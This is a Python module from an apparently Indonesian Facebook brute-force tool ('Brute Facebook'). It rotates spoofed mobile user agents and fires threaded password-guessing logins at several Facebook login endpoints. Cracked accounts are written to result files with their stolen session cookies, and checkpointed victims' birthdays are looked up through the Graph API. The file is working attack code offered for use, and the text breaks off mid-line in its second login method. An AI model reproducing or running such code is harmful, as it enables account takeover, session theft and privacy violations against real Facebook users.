#######################################################
# Name           : Brute Facebook (BF)                #
# File           : log.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, datetime, time, os
from concurrent.futures import ThreadPoolExecutor as Modol
from bs4 import BeautifulSoup as par
from .selesai import Selesai_crack
from datetime import datetime
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
#---- PROGRES ------
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
yakah = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
kuning = '[#FFFF00]'
ugen=[]
for xd in range(1000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen.append(memekk)
###########################################################################################
class Brute_crack:

    def __init__(self, oz, xx, xz):
        self.idd, self.apk, self.ok, self.met, self.cp, self.loop = [], [], [], [], [], 0
        self.iya, self.pwa, self.wa, self.tol, self.ses = [], [], [], Console(), requests.Session()
        self.idd, self.cok, self.tok = oz, xx, xz
        self.ua_mu()
        self.tampilkan_apk()
        self.plerr()

    def hapus_ua(self):
        try:os.remove("assets/ua_xx.txt")
        except:pass

    # ------- METODE --------
    def mentod(self):
        urut = []
        urut.append(Panel(f"[{biru_m}01{hapus}] method API (fast)\n[{biru_m}02{hapus}] method mbasic (slow)\n[{biru_m}03{hapus}] method mobile (super slow)",title=f'{merah}•{kuning}•{hijau}•{hijau} VALIDATE {hijau}•{kuning}•{merah}•{hapus}',padding=(0,1), style="bold white"))
        urut.append(Panel(f"[{biru_m}04{hapus}] method API (fast)\n[{biru_m}05{hapus}] method mbasic (slow)\n[{biru_m}06{hapus}] method mobile (super slow) ",title=f'{merah}•{kuning}•{hijau}•{hijau} REGGULAR {hijau}•{kuning}•{merah}•{hapus}',padding=(0,0), style="bold white"))
        self.tol.print(Columns(urut))
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel(f"[{biru_m}?{hapus}] tampilkan aplikasi terkait ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title=f'{merah}•{kuning}•{hijau}•{hijau} APLIKASI {hijau}•{kuning}•{merah}•{hapus}'))
        crot = input(f"[{M}?{N}] pilih: ")
        if crot in[""]:
            prints(Panel(f"[[bold red![/]] jangan kosong", style="bold white", width=70));self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            prints(Panel(f"[[bold red![/]] y/t bro", style="bold white", width=70));self.tampilkan_apk()
    # ------- UA RANDOM ----------------
    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()
    # ------- INGFO --------
    def ingfo(self):
        urut = []
        prints(Panel("      [[bold green] Hasil crack akan di simpan di dalam folder results[/] ]", padding=(0,1), style="bold white", width=70))
        urut.append(Panel(f"Hasil [bold green]OK-{ha}-{op}-{ta}.txt[/]",padding=(0,1),style="bold white"))
        urut.append(Panel(f"Hasil [bold yellow]CP-{ha}-{op}-{ta}.txt[/] ",padding=(0,1),style="bold white"))
        self.tol.print(Columns(urut))
        prints(Panel("          [[bold green]+[/]] cracking sedang di mulai [[bold green]+[/]]", padding=(0,5), style="bold white", width=70))
    # ------- SETTING USER AGENT --------
    def ua_mu(self):
        prints(Panel(f"[{biru_m}?{hapus}] gunakan user agent sendiri ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title=f'{merah}•{kuning}•{hijau}•{hijau} USERAGENT {hijau}•{kuning}•{merah}•{hapus}'))
        ua = input(f"[{M}?{N}] pilih: ")
        if ua in [" ", ""]:
            prints(Panel(f"[[bold red![/]] jangan kosong", style="bold white", width=70));self.ua_mu()
        elif ua in ["y", "y"]:
            self.hapus_ua()
            xx = input(f"[{M}?{N}] masukan user agent: ")
            open("assets/ua_xx.txt", "w").write(xx)
            prints(Panel(f"anda menggunakan user agent: [bold green]{xx}", style="bold white", width=70))
        elif ua in ["t", "t"]:
            self.hapus_ua()
            prints(Panel(f"[{biru_m}!{hapus}] anda menggunakan user agent bawaan script:)", padding=(0,5), style="bold white", width=70))
        else:
            prints(Panel(f"[[bold red![/]] y/t bro", style="bold white", width=70));self.ua_mu()
    # ------- GANTI BAHASA --------
    def language(self, cok):
        try:
            url = self.ses.get('https://mbasic.facebook.com/language/',cookies=cok)
            data = par(url.text,'html.parser')
            for x in data.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
                    self.ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cok)
        except:pass
    # ------- PILIH PASSWORD --------
    def plerr(self):
        self.wa.append(Panel.fit(f"[{biru_m}1[/]] pass manual", padding=(0,2), style="bold white"))
        self.wa.append(Panel.fit(f"[{biru_m}2[/]] pass gabung ", padding=(0,2), style="bold white"))
        self.wa.append(Panel.fit(f"[{biru_m}3[/]] pass otomatis", padding=(0,3), style="bold white"))
        self.tol.print(Columns(self.wa))
        ___yayanganteng___ = input(f"[{O}?{N}] pilih: ")
        if ___yayanganteng___ in ["1","01"]:
            prints(Panel(f' [[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            while True:
                pwek = input(f"[{O}?{N}] sandi : ")
                if pwek in[""," "]:
                    print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        elif cin in["4","04"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        elif cin in["5","05"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        elif cin in["6","06"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            Selesai_crack(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}!{N}] input yang bener");__yan__()
                    prints(Panel(f"crack dengan sandi -> [ {merah}{pwek} [/]]", style="bold white", width=70))
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["2","02"]:
            self.iya.append("ya")
            prints(Panel(f' [[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            kata = input(f"[{M}?{N}] sandi: ")
            xxxx = kata.split(",")
            for i in xxxx:
                self.pwa.append(i)
            prints(Panel(f"kata sandi tambahan -> [ {merah}{kata} [/]]", style="bold white", width=70))
            self.mentod()
            self.__pler__()
        elif ___yayanganteng___ in ["3","03"]:
            self.mentod()
            self.__pler__()
        else:
            print(f"  [{M}!{N}] y/t bro");self.plerr()
    ###---[ CONVERT COOKIE ]---###
    def ngoxok(self, cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))
    # ------- METODE LOGIN --------
    def validate(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("assets/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=random.choice(ugen)
                ses.headers.update({"Host": cebok,"cache-control": "max-age=0","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7"})
                link = ses.get(f"https://{cebok}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&locale2=en_GB&_rdr")
                data = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "uid":user,
                    "next":"https://"+cebok+"/login/save-device/",
                    "flow":"login_no_pin",
                    "pass":pw
                }
                head = {"Host": cebok,"connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+cebok,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer":link.url, "accept-encoding": "gzip, deflate br","accept-language": "ar,en-US;q=0.9,en;q=0.8,ar-SA;q=0.7"}
                xnxx = ses.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0&locale2=en_GB", data=data, headers=head, allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        self.cek_apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}").add(f"[bold green]{coki}ua={digi}")
                       # tree.add(f"[bold blue]{uas}[/]")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    try:
                        ytta = self.ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={self.tok}", cookies=self.cok).json()["birthday"]
                        month, day, year = ytta.split("/")
                        month = yakah[month]
                        tree.add(f"[bold yellow]{user}|{pw} {day} {month} {year}")
                        prints(tree)
                        wrt = (f" [×] {user}|{pw} {day} {month} {year}")
                        self.cp.append(wrt)
                        with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as a:
                            a.write(wrt+"\n")
                        break
                    except:
                        tree.add(f"[bold yellow]{user}|{pw}")
                        prints(tree)
                        wrt = (f" [×] {user}|{pw}")
                        self.cp.append(wrt)
                        with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                            w.write(wrt+"\n")
                        break
                else:
                    continue
            except Exception as e:
                prints(e)
#            except requests.exceptions.ConnectionError:
#                time.sleep(3)
        self.loop+=1

    def reguller(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("assets/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=random.choice(ugen)
                ses.headers.update({"Host": cebok,"cache-control": "max-age=0","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                p = ses.get(f"https://{cebok}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{cebok}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"email":user, "flow": "login_no_pin", "pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={"Host": cebok,"connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+cebok,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{cebok}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{cebok}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                po = ses.post(f'https://{cebok}/login/device-based/regular/login/?api_key=2036793259884297&auth_token=3cef90256fbcb9cbfe87b20fc6a1c7a8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&refsrc=deprecated&app_id=2036793259884297&cancel=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'